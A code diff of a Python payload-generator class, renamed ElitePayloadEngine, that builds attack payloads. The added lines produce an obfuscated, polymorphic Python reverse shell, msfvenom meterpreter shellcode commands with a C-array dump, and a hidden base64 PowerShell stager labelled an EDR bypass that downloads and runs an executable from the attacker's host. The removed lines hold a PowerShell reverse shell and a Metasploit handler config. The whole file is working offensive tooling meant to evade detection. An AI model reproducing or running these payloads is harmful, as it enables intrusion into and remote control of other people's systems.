@@ -1,37 +1,33 @@
 import base64
 import random
-class PayloadGenerator:
+class ElitePayloadEngine:
     def __init__(self, lhost, lport):
         self.lhost = lhost
         self.lport = lport
-    def generate_python_payload(self):
+    def generate_polymorphic_python(self):
+        junk_vars = ['_ghost_val_' + ''.join(random.choices('abcdef', k=6)) for _ in range(5)]
         raw_code = f"""import socket,os,subprocess
-s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
-s.connect(('{self.lhost}',{self.lport}))
-os.dup2(s.fileno(),0)
-os.dup2(s.fileno(),1)
-os.dup2(s.fileno(),2)
-p=subprocess.call(['/bin/sh','-i'])"""
+{junk_vars[0]} = '{self.lhost}'
+{junk_vars[1]} = {self.lport}
+{junk_vars[2]} = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
+{junk_vars[2]}.connect(({junk_vars[0]},{junk_vars[1]}))
+for {junk_vars[3]} in range(3):
+    os.dup2({junk_vars[2]}.fileno(), {junk_vars[3]})
+{junk_vars[4]} = subprocess.call(['/bin/sh','-i'])"""
         encoded = base64.b64encode(raw_code.encode()).decode()
-        obfuscated = f"import base64,exec; exec(base64.b64decode('{encoded}').decode())"
-        return obfuscated
-    def generate_powershell_payload(self):
-        ps_cmd = f"$client = New-Object System.Net.Sockets.TCPClient('{self.lhost}',{self.lport});$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){{;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0,$i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()}};$client.Close()"
-        encoded_ps = base64.b64encode(ps_cmd.encode('utf-16le')).decode()
-        return f"powershell -NoP -NonI -W Hidden -Exec Bypass -Enc {encoded_ps}"
-    def generate_meterpreter_command(self, os_type="windows"):
-        if os_type == "windows":
-            return f"msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST={self.lhost} LPORT={self.lport} -f exe -o payload.exe --encoder x64/xor_dynamic"
-        elif os_type == "linux":
-            return f"msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST={self.lhost} LPORT={self.lport} -f elf -o payload.elf"
-        elif os_type == "android":
-            return f"msfvenom -p android/meterpreter/reverse_tcp LHOST={self.lhost} LPORT={self.lport} -o payload.apk"
+        return f"import base64,sys; exec(base64.b64decode('{encoded}').decode())"
+    def generate_raw_shellcode_command(self, arch="x64"):
+        if arch == "x64":
+            return f"msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST={self.lhost} LPORT={self.lport} -f raw -o payload.bin"
+        elif arch == "x86":
+            return f"msfvenom -p windows/meterpreter/reverse_tcp LHOST={self.lhost} LPORT={self.lport} -f raw -o payload.bin"
+        elif arch == "linux":
+            return f"msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST={self.lhost} LPORT={self.lport} -f raw -o payload.bin"
         return ""
-    def get_msf_handler_config(self, os_type="windows"):
-        payloads = {
-            "windows": "windows/x64/meterpreter/reverse_tcp",
-            "linux": "linux/x64/meterpreter/reverse_tcp",
-            "android": "android/meterpreter/reverse_tcp"
-        }
-        p = payloads.get(os_type, "windows/x64/meterpreter/reverse_tcp")
-        return f"use exploit/multi/handler\nset PAYLOAD {p}\nset LHOST {self.lhost}\nset LPORT {self.lport}\nset EnableStageEncoding true\nexploit"
+    def generate_c_array_shellcode(self, arch="x64"):
+        raw_cmd = self.generate_raw_shellcode_command(arch)
+        return f"# Run this on Kali to get C-Array shellcode:\n{raw_cmd} && hexdump -v -e '\"0x\" 1/1 \"%02x\" \", \"' payload.bin"
+    def generate_edr_bypass_stager(self):
+        ps_stager = f"$w=New-Object Net.WebClient;$u='http://{self.lhost}:{self.lport}/payload.bin';[System.IO.File]::WriteAllBytes('C:\\Windows\\Temp\\sys.exe',(New-Object Net.WebClient).DownloadData($u));Start-Process 'C:\\Windows\\Temp\\sys.exe'"
+        encoded_stager = base64.b64encode(ps_stager.encode('utf-16le')).decode()
+        return f"powershell -WindowStyle Hidden -NoP -NonI -EncodedCommand {encoded_stager}"
